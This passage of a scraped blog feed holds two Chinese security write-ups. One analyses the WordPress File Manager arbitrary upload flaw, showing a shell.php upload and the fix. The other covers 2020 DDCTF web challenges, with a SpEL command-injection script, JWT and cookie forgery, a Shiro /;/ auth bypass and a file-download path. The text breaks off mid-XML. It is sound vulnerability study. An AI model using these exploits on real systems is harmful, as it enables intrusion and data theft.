class="keyword">$this</span>-&gt;mimeDetect === <span class="string">'internal'</span>) &#123;</span><br><span class="line">            $mime = <span class="keyword">$this</span>-&gt;mimetype($tmpname, $name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $mime = <span class="keyword">$this</span>-&gt;mimetype($tmpname, $name);</span><br><span class="line">            $mimeByName = <span class="keyword">$this</span>-&gt;mimetype($name, <span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">if</span> ($mime === <span class="string">'unknown'</span>) &#123;</span><br><span class="line">                $mime = $mimeByName;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;allowPutMime($mime) || ($mimeByName &amp;&amp; !<span class="keyword">$this</span>-&gt;allowPutMime($mimeByName))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_UPLOAD_FILE_MIME, <span class="string">'('</span> . $mime . <span class="string">')'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $tmpsize = (int)sprintf(<span class="string">'%u'</span>, filesize($tmpname));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;uploadMaxSize &gt; <span class="number">0</span> &amp;&amp; $tmpsize &gt; <span class="keyword">$this</span>-&gt;uploadMaxSize) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_UPLOAD_FILE_SIZE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $dstpath = <span class="keyword">$this</span>-&gt;decode($dst);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($hashes[$name])) &#123;</span><br><span class="line">            $test = <span class="keyword">$this</span>-&gt;decode($hashes[$name]);</span><br><span class="line">            $file = <span class="keyword">$this</span>-&gt;stat($test);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $test = <span class="keyword">$this</span>-&gt;joinPathCE($dstpath, $name);</span><br><span class="line">            $file = <span class="keyword">$this</span>-&gt;isNameExists($test);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearcache();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($file &amp;&amp; $file[<span class="string">'name'</span>] === $name) &#123; <span class="comment">// file exists and check filename for item ID based filesystem</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;uploadOverwrite) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!$file[<span class="string">'write'</span>]) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_PERM_DENIED);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> ($file[<span class="string">'mime'</span>] == <span class="string">'directory'</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_NOT_REPLACE, $name);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;remove($test);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $name = <span class="keyword">$this</span>-&gt;uniqueName($dstpath, $name, <span class="string">'-'</span>, <span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $stat = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'mime'</span> =&gt; $mime,</span><br><span class="line">            <span class="string">'width'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'height'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'size'</span> =&gt; $tmpsize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// $w = $h = 0;</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($mime, <span class="string">'image'</span>) === <span class="number">0</span> &amp;&amp; ($s = getimagesize($tmpname))) &#123;</span><br><span class="line">            $stat[<span class="string">'width'</span>] = $s[<span class="number">0</span>];</span><br><span class="line">            $stat[<span class="string">'height'</span>] = $s[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// $this-&gt;clearcache();</span></span><br><span class="line">        <span class="keyword">if</span> (($path = <span class="keyword">$this</span>-&gt;saveCE($fp, $dstpath, $name, $stat)) == <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $stat = <span class="keyword">$this</span>-&gt;stat($path);</span><br><span class="line">        <span class="comment">// Try get URL</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($stat[<span class="string">'url'</span>]) &amp;&amp; ($url = <span class="keyword">$this</span>-&gt;getContentUrl($stat[<span class="string">'hash'</span>]))) &#123;</span><br><span class="line">            $stat[<span class="string">'url'</span>] = $url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $stat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先进入<code>commandDisabled()</code>函数，返回false。</p>
<img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908150731360.png" alt="image-20200908150731360" style="zoom:150%;">

<p>然后进入<code>dir()</code>函数，参数为<code>$dst</code>即<code>POST</code>传入的<code>target</code>值。</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908153636101-1599734809121.png" alt="image-20200908153636101"></p>
<p>调用了file函数，</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908153733922-1599734813491.png" alt="image-20200908153733922"></p>
<p>跟进<code>decode()</code>函数</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908153822619-1599734816115.png" alt="image-20200908153822619"></p>
<img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908154015274.png" alt="image-20200908154015274" style="zoom:150%;">

<p>decode()函数首先判断是否以$this-&gt;id开头，然后截取出<code>l1_</code>后面的内容，之后进行base64解密，uncrypt函数如上，未作操作。然后更换分隔符，之后调用<code>abspathCE()</code>函数，从注释中可以看出，<code>abspathCE()</code>函数会先判断$path是否等于分隔符<code>\</code>,如果等于，返回<code>$this-&gt;root</code>，否则返回<code>$this-&gt;root拼接$path</code>。看下对应的<code>abspathCE()</code>函数。</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908160039652-1599734821833.png" alt="image-20200908160039652"></p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908155954458-1599734824736.png" alt="image-20200908155954458"></p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908155946798-1599734827321.png" alt="image-20200908155946798"></p>
<blockquote>
<p><strong>ps：POST传入target前缀不同的区别</strong></p>
<ul>
<li>前缀为<code>l1_</code>时，<code>$this-&gt;root</code> 为<code>C:\Users\admin\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files</code></li>
</ul>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908161235911-1599734830148.png" alt="image-20200908161235911"></p>
<ul>
<li>前缀为<code>t1_</code>时，<code>$this-&gt;disabled[]</code>包含<code>upload</code>，程序会报错结束，<code>$this-&gt;root</code> 为<code>C:\Users\admin\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files\.trash</code></li>
</ul>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908160836714-1599734833086.png" alt="image-20200908160836714"></p>
</blockquote>
<p>继续分析程序流程，<code>decode()</code>函数会返回<code>C:\Users\admin\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files</code>,然后调用<code>stat()</code>函数。</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908153733922-1599734838249.png" alt="image-20200908153733922"></p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908162459331-1599734840447.png" alt="image-20200908162459331"></p>
<p>返回的<code>$ret</code>为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [isowner] =&gt; </span><br><span class="line">    [ts] =&gt; <span class="number">1589423646</span></span><br><span class="line">    [mime] =&gt; directory</span><br><span class="line">    [read] =&gt; <span class="number">1</span></span><br><span class="line">    [write] =&gt; <span class="number">1</span></span><br><span class="line">    [size] =&gt; <span class="number">0</span></span><br><span class="line">    [hash] =&gt; l1_Lw</span><br><span class="line">    [name] =&gt; files</span><br><span class="line">    [rootRev] =&gt; </span><br><span class="line">    [options] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [path] =&gt; </span><br><span class="line">            [url] =&gt; /wordpress/wp-content/plugins/wp-file-manager/lib/php/../files/</span><br><span class="line">            [tmbUrl] =&gt; /wordpress/wp-content/plugins/wp-file-manager/lib/php/../files/.tmb/</span><br><span class="line">            [disabled] =&gt; <span class="keyword">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="number">0</span>] =&gt; chmod</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [separator] =&gt; \</span><br><span class="line">            [copyOverwrite] =&gt; <span class="number">1</span></span><br><span class="line">            [uploadOverwrite] =&gt; <span class="number">1</span></span><br><span class="line">            [uploadMaxSize] =&gt; <span class="number">9223372036854775807</span></span><br><span class="line">            [uploadMaxConn] =&gt; <span class="number">3</span></span><br><span class="line">            [uploadMime] =&gt; <span class="keyword">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [firstOrder] =&gt; deny</span><br><span class="line">                    [allow] =&gt; <span class="keyword">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [<span class="number">0</span>] =&gt; all</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [deny] =&gt; <span class="keyword">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [<span class="number">0</span>] =&gt; all</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [dispInlineRegex] =&gt; ^(?:(?:video|audio)|image/(?!.+\+xml)|application/(?:ogg|x-mpegURL|dash\+xml)|(?:text/plain|application/pdf)$)</span><br><span class="line">            [jpgQuality] =&gt; <span class="number">100</span></span><br><span class="line">            [archivers] =&gt; <span class="keyword">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [create] =&gt; <span class="keyword">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [<span class="number">0</span>] =&gt; application/x-tar</span><br><span class="line">                            [<span class="number">1</span>] =&gt; application/zip</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [extract] =&gt; <span class="keyword">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [<span class="number">0</span>] =&gt; application/x-tar</span><br><span class="line">                            [<span class="number">1</span>] =&gt; application/zip</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [createext] =&gt; <span class="keyword">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [application/x-tar] =&gt; tar</span><br><span class="line">                            [application/zip] =&gt; zip</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [uiCmdMap] =&gt; <span class="keyword">Array</span></span><br><span class="line">                (</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [syncChkAsTs] =&gt; <span class="number">1</span></span><br><span class="line">            [syncMinMs] =&gt; <span class="number">10000</span></span><br><span class="line">            [i18nFolderName] =&gt; <span class="number">0</span></span><br><span class="line">            [tmbCrop] =&gt; <span class="number">1</span></span><br><span class="line">            [tmbReqCustomData] =&gt; </span><br><span class="line">            [substituteImg] =&gt; <span class="number">1</span></span><br><span class="line">            [onetimeUrl] =&gt; <span class="number">1</span></span><br><span class="line">            [trashHash] =&gt; t1_Lw</span><br><span class="line">            [csscls] =&gt; elfinder-navbar-root-local</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [volumeid] =&gt; l1_</span><br><span class="line">    [locked] =&gt; <span class="number">1</span></span><br><span class="line">    [isroot] =&gt; <span class="number">1</span></span><br><span class="line">    [phash] =&gt; </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>返回<code>dir()</code>函数，然后在返回到<code>upload()</code>函数，将返回值赋给<code>upload()</code>函数中的<code>$dir</code>变量，</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908172728778-1599734848077.png" alt="image-20200908172728778"></p>
<p>然后进行<code>mime</code>的判断，程序识别上传的php脚本的<code>mime</code>为<code>text/x-php</code>，跟进<code>allowPutMime()</code>函数，</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908175400724-1599734850961.png" alt="image-20200908175400724"></p>
<p>从程序自带的注释中可以看出如果<code>uploadOrder</code>数组为<code>array(&#39;deny&#39;,&#39;allow&#39;)</code>，则默认时允许上传的<code>mime</code>。然后获取文件的大小，若文件大小不合法报错结束程序，之后<code>decode()</code>处理<code>$dst</code>(<strong><code>POST</code>传入的<code>target</code>值</strong>)赋给<code>$dstpath</code>，因为<code>$hash</code>为空数组，所以会调用<code>joinPathCE()</code>将<code>$dstpath</code>和<code>$name</code>(<strong>上传文件的文件名</strong>)拼接，然后检查文件是否存在。</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908180818104-1599734854769.png" alt="image-20200908180818104"></p>
<p>最后调用<code>$this-&gt;saveCE()</code></p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908181044918-1599734857093.png" alt="image-20200908181044918"></p>
<p>跟进<code>_save()</code>。</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908181932277-1599734861053.png" alt="image-20200908181932277"></p>
<p>本地时利用Windows系统分析，<code>$path</code>为<code>C:\Users\admin\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files\shell.php</code>;<code>$uri</code>为<code>C:\Windows\phpxxxx.tmp</code>，最后会调用<code>copy()</code>将上传的文件复制到<code>\wordpress\wp-content\plugins\wp-file-manager\lib\files\shell.php</code>，即完成了任意文件上传。</p>
<img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908184402757.png" alt="image-20200908184402757" style="zoom:150%;">

<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h1><p>利用burp发包</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908183438085-1599734867412.png" alt="image-20200908183438085"></p>
<p>访问<a href="http://192.168.43.44/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php" target="_blank" rel="noopener">http://192.168.43.44/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php</a></p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908183522240-1599734870037.png" alt="image-20200908183522240"></p>
<h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h1><blockquote>
<p>影响范围</p>
<p>file manager 6.0至6.8</p>
</blockquote>
<p>官方修复删除了connector.minimal.php和connector.minimal.php-dist文件。</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908183148666-1599734873382.png" alt="image-20200908183148666"></p>
<p>增加了.htaccess。</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908183049056-1599734876220.png" alt="image-20200908183049056"></p>
<p>参考:</p>
<p><a href="https://cn-sec.com/archives/117417.html" target="_blank" rel="noopener">紧急！WordPress文件管理器插件爆严重0day漏洞</a></p>
]]></content>
      <tags>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title>2020DDCTFweb题目</title>
    <url>/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>趁环境还没关，赶紧复现</p>
<a id="more"></a>

<h1 id="0x01-web-签到题"><a href="#0x01-web-签到题" class="headerlink" title="0x01 web 签到题"></a>0x01 web 签到题</h1><p>利用c-jwt-cracker可以爆破出jwt密钥，</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200904201412608-1599460818427.png" alt="image-20200904201412608"></p>
<p>然后伪造jwt-token</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200904201350339-1599460818429.png" alt="image-20200904201350339"></p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200904201328523.png" alt="image-20200904201328523"></p>
<p>下载到client。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export http_ptoxy&#x3D;127.0.0.1:8080</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907172631133.png" alt="image-20200907172631133"></p>
<p>burp抓包</p>
<img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907172709427.png" alt="image-20200907172709427" style="zoom:150%;">

<p>逆向client，web狗不会逆向，看wp说是用的 HMAC sha256加密，密钥是DDCTFWithYou。</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907185108863.png" alt="image-20200907185108863"></p>
<p>验证：</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907190017072.png" alt="image-20200907190017072"></p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907185932978.png" alt="image-20200907185932978"></p>
<p>赛后看wp知道是spel，参考<a href="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/#Overwrite-Me" target="_blank" rel="noopener">l3yx</a>的脚本</p>
<blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSignature</span><span class="params">(command,time)</span>:</span></span><br><span class="line">    command=urllib.parse.quote(command)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Host"</span>: <span class="string">"1024tools.com"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">"https://1024tools.com/hmac"</span></span><br><span class="line">    data=<span class="string">"query="</span>+command+<span class="string">"|"</span>+time+<span class="string">"&amp;algo=sha256&amp;key=DDCTFWithYou"</span></span><br><span class="line">    res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line">    r=re.compile(<span class="string">'B:（HMAC(.*?)&lt;textarea class="form-control" id="result_base64" rows="2" spellcheck="false" name="result" cols="50"&gt;(.*?)&lt;/textarea&gt;'</span>,re.DOTALL)</span><br><span class="line">    <span class="keyword">return</span> r.search(res.text).group(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendCommand</span><span class="params">(command,time)</span>:</span></span><br><span class="line">    signature = getSignature(command,time)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Host"</span>: <span class="string">"117.51.136.197"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">"http://117.51.136.197/server/command"</span></span><br><span class="line">    data = <span class="string">'&#123;"signature":"'</span>+signature+<span class="string">'","command":"'</span>+command+<span class="string">'","timestamp":'</span>+time+<span class="string">'&#125;'</span></span><br><span class="line"></span><br><span class="line">    res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line">command = <span class="string">"T(java.nio.file.Files).lines(T(java.nio.file.Paths).get('/home/dc2-user/flag/flag.txt'))"</span></span><br><span class="line">command = <span class="string">"new java.util.Scanner(new java.io.File('/home/dc2-user/flag/flag.txt')).next()"</span></span><br><span class="line">print(sendCommand(command,str(int(time.time()))))</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907190221623.png" alt="image-20200907190221623" style="zoom:150%;">



<h1 id="0x02-卡片商店"><a href="#0x02-卡片商店" class="headerlink" title="0x02 卡片商店"></a>0x02 卡片商店</h1><p>可以借卡片，如果借2的61次方会溢出，导致还两张即可，等40秒，就会换完，可以兑换礼物。</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907190752097.png" alt="image-20200907190752097"></p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907191016881.png" alt="image-20200907191016881"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">某礼物商店正在做活动，100张卡片可兑换礼物，你能帮小明换到他想要的礼物吗？规则如下：</span><br><span class="line">1. 截止2020-09-04 08:55:34之前，每20秒会免费获得1张卡片，且可进行礼物兑换。</span><br><span class="line">2. 可随时向朋友互借卡片。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">小明目前手上有4611686018427387706张卡片。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">恭喜你，买到了礼物，里面有夹心饼干、杜松子酒和一张小纸条，纸条上面写着：url: &#x2F;flag , SecKey: Udc13VD5adM_c10nPxFu@v12，你能看懂它的含义吗？</span><br></pre></td></tr></table></figure>

<p>看cookie，通过搜索可以知道为go的Gorilla session</p>
<p>利用这个<a href="https://github.com/EddieIvan01/secure-cookie-faker/releases/tag/v0.3.2" target="_blank" rel="noopener">工具</a>伪造cookie,</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200904195829476.png" alt="image-20200904195829476"></p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200904195946296.png" alt="image-20200904195946296"></p>
<h1 id="0x03-easy-web"><a href="#0x03-easy-web" class="headerlink" title="0x03 easy web"></a>0x03 easy web</h1><p>截包可以发现rememberme,可以确定是shiro</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907145411924.png" alt="image-20200907145411924"></p>
<p>然后用xray，常见的密钥也没有跑出来，看wp后知道是<a href="https://l3yx.github.io/2020/06/30/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/" target="_blank" rel="noopener">shiro的权限绕过漏洞</a>,用/;/可以绕过认证。</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907145557582.png" alt="image-20200907145557582"></p>
<p>存在任意文件下载漏洞。</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907145759976.png" alt="image-20200907145759976"></p>
<p>/34867ccfda85234382210155be32525c/;/web/img?img=WEB-INF/web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"3.0"</span> <span class="attr">metadata-complete</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span></span><br><span class="line">      classpath:spring-core.xml</span><br><span class="line">    <span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.util.WebAppRootListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.util.IntrospectorCleanupListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 